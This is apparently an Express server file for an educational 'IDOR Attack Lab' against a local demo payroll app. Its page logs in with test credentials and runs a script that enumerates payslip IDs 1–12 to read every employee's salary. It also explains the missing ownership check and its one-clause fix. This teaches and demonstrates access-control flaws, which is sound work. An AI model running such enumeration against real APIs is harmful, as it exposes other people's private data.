/*
 * Terminal 2: cd demo-attacked/idor && npm run attacker
 */

const express = require('express');

const app = express();
const PORT = 3041;
const VICTIM_PORT = 3040;
const PROTECTED_PORT = 3042;

const SWITCHER_CSS = `
    .target-switcher {
      position: fixed;
      bottom: 1rem;
      left: 1rem;
      display: flex;
      gap: 0.5rem;
      z-index: 9999;
    }
    .target-switcher button {
      padding: 0.4rem 0.85rem;
      border-radius: 6px;
      font-size: 0.8rem;
      font-weight: 600;
      cursor: pointer;
      border: 1px solid;
    }
    .target-switcher .btn-vulnerable {
      background: #1e293b;
      color: #fff;
      border-color: #334155;
    }
    .target-switcher .btn-vulnerable.active {
      background: #fff;
      color: #1e293b;
      border-color: #fff;
    }
    .target-switcher .btn-protected {
      background: #dc2626;
      color: #fff;
      border-color: #dc2626;
    }
    .target-switcher .btn-protected.active {
      background: #ef4444;
      color: #fff;
      border-color: #ef4444;
    }`;

const DASHBOARD_STYLE = `
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: 'Courier New', Courier, monospace;
      background: #0a0a0a;
      color: #00ff41;
      min-height: 100vh;
      padding: 2rem;
    }
    h1 {
      font-size: 1.4rem;
      margin-bottom: 0.5rem;
      text-shadow: 0 0 8px rgba(0, 255, 65, 0.4);
    }
    .subtitle { color: #4ade80; margin-bottom: 2rem; font-size: 0.9rem; }
    .flow-box {
      background: #111;
      border: 1px solid #1a3a1a;
      border-radius: 8px;
      padding: 1.5rem;
      margin-bottom: 2rem;
      line-height: 1.9;
      font-size: 0.9rem;
    }
    .flow-box strong { color: #facc15; }
    .credentials-panel {
      background: #111;
      border: 1px solid #1a3a1a;
      border-radius: 8px;
      padding: 1.5rem;
      margin-bottom: 2rem;
    }
    .credentials-panel h2 {
      font-size: 0.95rem;
      color: #94a3b8;
      margin-bottom: 1rem;
      text-transform: uppercase;
      letter-spacing: 1px;
    }
    table {
      width: 100%;
      border-collapse: collapse;
      font-size: 0.85rem;
    }
    th {
      text-align: left;
      padding: 0.6rem 0.75rem;
      border-bottom: 1px solid #1a3a1a;
      color: #64748b;
      font-weight: 600;
    }
    td {
      padding: 0.75rem;
      border-bottom: 1px solid #0d1f0d;
      word-break: break-all;
    }
    .empty-state {
      color: #64748b;
      font-style: italic;
      padding: 1rem 0;
    }
    .entry-new { animation: glow 0.6s ease-out; }
    @keyframes glow {
      0% { background: rgba(0, 255, 65, 0.15); }
      100% { background: transparent; }
    }
    .referer-panel {
      background: #111;
      border: 1px solid #1a3a1a;
      border-radius: 8px;
      padding: 1.5rem;
      margin-top: 2rem;
    }
    .referer-panel h2 {
      font-size: 0.95rem;
      color: #94a3b8;
      margin-bottom: 1rem;
      text-transform: uppercase;
      letter-spacing: 1px;
    }
    .referer-panel p {
      font-size: 0.85rem;
      color: #94a3b8;
      line-height: 1.7;
      margin-bottom: 1.25rem;
      max-width: 640px;
    }
    .demo-buttons {
      display: flex;
      flex-wrap: wrap;
      gap: 0.75rem;
    }
    .demo-btn {
      background: #1e293b;
      color: #e2e8f0;
      border: 1px solid #334155;
      padding: 0.55rem 1rem;
      border-radius: 6px;
      font-size: 0.8rem;
      font-weight: 600;
      cursor: pointer;
      font-family: 'Courier New', Courier, monospace;
    }
    .demo-btn:hover { background: #334155; }
    .demo-btn.primary { background: #0d9488; border-color: #0d9488; color: #fff; }
    .demo-btn.primary:hover { background: #0f766e; }
    ${SWITCHER_CSS}`;

const LAB_EXTRA_STYLE = `
    input.field {
      background: #111;
      border: 1px solid #1a3a1a;
      color: #00ff41;
      font-family: 'Courier New', Courier, monospace;
      font-size: 0.82rem;
      padding: 0.4rem 0.6rem;
      border-radius: 4px;
    }
    .result-banner {
      padding: 0.6rem 1rem;
      border-radius: 4px;
      font-size: 0.82rem;
      margin-top: 0.75rem;
      display: none;
    }
    .result-banner.success { background: #052e16; border: 1px solid #16a34a; color: #4ade80; }
    .result-banner.failure { background: #450a0a; border: 1px solid #dc2626; color: #fca5a5; }
    .result-banner.info    { background: #0c1a2e; border: 1px solid #1e40af; color: #93c5fd; }
    pre.decoded-box {
      background: #0a0a0a;
      border: 1px solid #1a3a1a;
      border-radius: 4px;
      padding: 0.75rem;
      font-size: 0.78rem;
      color: #cbd5e1;
      white-space: pre-wrap;
      word-break: break-all;
      margin-top: 0.5rem;
    }`;

function buildGuideHtml() {
  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>IDOR Attack Lab</title>
  <style>${DASHBOARD_STYLE}${LAB_EXTRA_STYLE}</style>
</head>
<body>
  <h1>🔓 IDOR Attack Lab — PayrollHub</h1>
  <p class="subtitle">Authentication without authorization — increment the ID, read anyone's salary</p>

  <div class="credentials-panel">
    <h2>Credentials</h2>
    <table>
      <thead><tr><th>Field</th><th>Value</th></tr></thead>
      <tbody>
        <tr><td>Target</td><td>http://localhost:${VICTIM_PORT}</td></tr>
        <tr><td>Username</td><td>alice</td></tr>
        <tr><td>Password</td><td>alice123</td></tr>
        <tr><td>Alice's payslip IDs</td><td>1, 2, 3</td></tr>
        <tr><td>Bob's payslip IDs</td><td>4, 5, 6</td></tr>
        <tr><td>Charlie (manager) IDs</td><td>7, 8, 9</td></tr>
        <tr><td>HR director IDs</td><td>10, 11, 12</td></tr>
      </tbody>
    </table>
  </div>

  <div class="flow-box">
    <strong>Step 1 — Login as Alice</strong><br><br>
    <div style="display:flex;gap:0.5rem;align-items:center;flex-wrap:wrap">
      <input class="field" id="login-user" value="alice" style="width:120px">
      <input class="field" id="login-pass" value="alice123" type="password" style="width:120px">
      <button class="demo-btn" id="btn-login">Login → :${VICTIM_PORT}</button>
    </div>
    <div class="result-banner" id="login-result"></div>
    <div style="margin-top:0.5rem;font-size:0.78rem;color:#64748b">Token stored — all requests below will use it automatically.</div>
    <br>
    <strong>Step 2 — Fetch Your Own Payslip</strong><br><br>
    <div style="display:flex;gap:0.5rem;align-items:center;flex-wrap:wrap">
      <label style="font-size:0.82rem;color:#94a3b8">Payslip ID:</label>
      <input class="field" id="payslip-id" value="1" style="width:80px" type="number" min="1" max="20">
      <button class="demo-btn" id="btn-fetch">GET /api/payslips/:id</button>
    </div>
    <div class="result-banner" id="fetch-result"></div>
    <pre class="decoded-box" id="fetch-output" style="min-height:100px">Response will appear here</pre>
    <div class="flow-box" style="margin-top:0.75rem">
      <strong>SQL EXECUTED ON VULNERABLE SERVER</strong><br>
      <pre id="sql-display">SELECT * FROM payslips WHERE id = <span id="sql-id" style="color:#ff6b6b">1</span>
-- ⚠️ No "AND user_id = ?" — ownership never verified
-- Any authenticated user can request any ID</pre>
    </div>
  </div>

  <div class="flow-box">
    <strong>⚡ Auto-Enumerate All Payslips</strong><br><br>
    <p style="font-size:0.85rem;color:#94a3b8;max-width:640px">
      Tries IDs 1–12 in sequence and collects every payslip returned. In a real engagement this
      reveals every employee's salary in seconds.
    </p>
    <div style="display:flex;gap:0.5rem;align-items:center;margin-bottom:0.75rem">
      <button class="demo-btn" id="btn-enumerate">⚡ Enumerate IDs 1–12</button>
      <span id="enum-progress" style="font-size:0.82rem;color:#64748b"></span>
    </div>
    <div class="result-banner" id="enum-result"></div>
  </div>

  <div class="flow-box">
    <strong>🔍 Root Cause</strong><br><br>
    <pre class="decoded-box">VULNERABLE query (port ${VICTIM_PORT}):
  SELECT * FROM payslips WHERE id = ?
  ↑
  Only checks: does this payslip exist?
  Does NOT check: does it belong to the requesting user?

PROTECTED query (port ${PROTECTED_PORT}):
  SELECT * FROM payslips WHERE id = ? AND user_id = ?
  ↑                                       ↑
  Does payslip exist?          Does it belong to YOU?

The fix is literally one SQL clause.
Authentication  ≠  Authorization
"Are you logged in?"  ≠  "Do you own this resource?"</pre>
  </div>

  <div class="target-switcher">
    <button type="button" class="btn-vulnerable" id="btn-switcher-vulnerable">Vulnerable (${VICTIM_PORT})</button>
    <button type="button" class="btn-protected" id="btn-switcher-protected">Protected (${PROTECTED_PORT})</button>
  </div>

  <script>
    var authToken = null;

    function showBanner(id, type, msg) {
      var el = document.getElementById(id);
      el.className = 'result-banner ' + type;
      el.textContent = msg;
      el.style.display = 'block';
    }

    document.getElementById('payslip-id').addEventListener('input', function() {
      document.getElementById('sql-id').textContent = this.value || '?';
    });

    document.getElementById('btn-login').addEventListener('click', async function() {
      try {
        var res = await fetch('http://localhost:${VICTIM_PORT}/api/login', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            username: document.getElementById('login-user').value,
            password: document.getElementById('login-pass').value
          })
        });
        var data = await res.json();
        if (!res.ok) { showBanner('login-result', 'failure', '✗ ' + data.error); return; }
        authToken = data.token;
        showBanner('login-result', 'success', '✓ Logged in as ' + data.user.username + ' (id: ' + data.user.id + ')');
      } catch(e) { showBanner('login-result', 'failure', '✗ ' + e.message); }
    });

    document.getElementById('btn-fetch').addEventListener('click', async function() {
      if (!authToken) { showBanner('fetch-result', 'failure', '✗ Login first'); return; }
      var id = document.getElementById('payslip-id').value;
      try {
        var res = await fetch('http://localhost:${VICTIM_PORT}/api/payslips/' + id, {
          headers: { 'Authorization': 'Bearer ' + authToken }
        });
        var data = await res.json();
        document.getElementById('fetch-output').textContent = JSON.stringify(data, null, 2);
        if (res.ok) {
          showBanner('fetch-result', 'success', '✓ Payslip #' + id + ' returned — user_id: ' + data.user_id + ', annual_salary: $' + data.annual_salary.toLocaleString());
        } else {
          showBanner('fetch-result', 'failure', '✗ ' + data.error);
        }
      } catch(e) { showBanner('fetch-result', 'failure', '✗ ' + e.message); }
    });

    document.getElementById('btn-enumerate').addEventListener('click', async function() {
      if (!authToken) { showBanner('enum-result', 'failure', '✗ Login first'); return; }
      var progress = document.getElementById('enum-progress');
      var results = [];

      for (var i = 1; i <= 12; i++) {
        progress.textContent = 'Trying ID ' + i + '/12...';
        try {
          var res = await fetch('http://localhost:${VICTIM_PORT}/api/payslips/' + i, {
            headers: { 'Authorization': 'Bearer ' + authToken }
          });
          if (res.ok) {
            var data = await res.json();
            results.push(Object.assign({ id: i }, data));
          }
        } catch(e) { /* skip */ }
        await new Promise(function(r) { setTimeout(r, 50); });
      }

      progress.textContent = '';
      showBanner('enum-result', 'success', '✓ Found ' + results.length + ' payslips across ' + new Set(results.map(function(r){ return r.user_id; })).size + ' users');

      var table = '<table style="width:100%;border-collapse:collapse;font-size:0.82rem;margin-top:1rem">';
      table += '<tr style="color:#64748b;border-bottom:1px solid #1a3a1a"><th style="text-align:left;padding:0.4rem 0.6rem">ID</th><th>user_id</th><th>Period</th><th>Annual Salary</th><th>Net Pay</th><th>Dept</th></tr>';
      results.forEach(function(r) {
        var isOwn = r.user_id === 1;
        var rowColor = isOwn ? '#052e16' : '#450a0a';
        var textColor = isOwn ? '#4ade80' : '#fca5a5';
        table += '<tr style="background:' + rowColor + ';color:' + textColor + '">';
        table += '<td style="padding:0.4rem 0.6rem">#' + r.id + '</td>';
        table += '<td style="padding:0.4rem 0.6rem">' + r.user_id + (isOwn ? ' (you)' : ' ⚠️') + '</td>';
        table += '<td style="padding:0.4rem 0.6rem">' + r.period + '</td>';
        table += '<td style="padding:0.4rem 0.6rem">$' + r.annual_salary.toLocaleString() + '</td>';
        table += '<td style="padding:0.4rem 0.6rem">$' + r.net_pay.toLocaleString() + '</td>';
        table += '<td style="padding:0.4rem 0.6rem">' + r.department + '</td>';
        table += '</tr>';
      });
      table += '</table>';

      var existing = document.getElementById('enum-table');
      if (existing) existing.remove();
      var div = document.createElement('div');
      div.id = 'enum-table';
      div.innerHTML = table;
      document.getElementById('enum-result').after(div);
    });

    document.getElementById('btn-switcher-vulnerable').addEventListener('click', function() {
      window.open('http://localhost:${VICTIM_PORT}', '_blank');
    });
    document.getElementById('btn-switcher-protected').addEventListener('click', function() {
      window.open('http://localhost:${PROTECTED_PORT}', '_blank');
    });
  </script>
</body>
</html>`;
}

app.get('/', function (req, res) {
  res.send(buildGuideHtml());
});

app.listen(PORT, function () {
  console.log('IDOR Attack Lab running at http://localhost:' + PORT);
});
